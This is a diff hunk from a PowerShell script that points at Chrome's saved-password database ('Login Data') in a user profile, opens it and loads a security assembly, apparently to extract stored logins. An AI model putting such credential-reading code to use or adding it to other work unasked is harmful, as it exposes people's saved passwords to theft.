@@ -17,7 +17,7 @@
 
 # Use the default location in the current user's profile
 $User = $Env:USERPROFILE
-$DbFile = "$User\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+$DbFile = "$User\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
 $Stream = New-Object IO.FileStream -ArgumentList "$DbFile", 'Open', 'Read', 'ReadWrite'
 
 Add-Type -AssemblyName System.Security
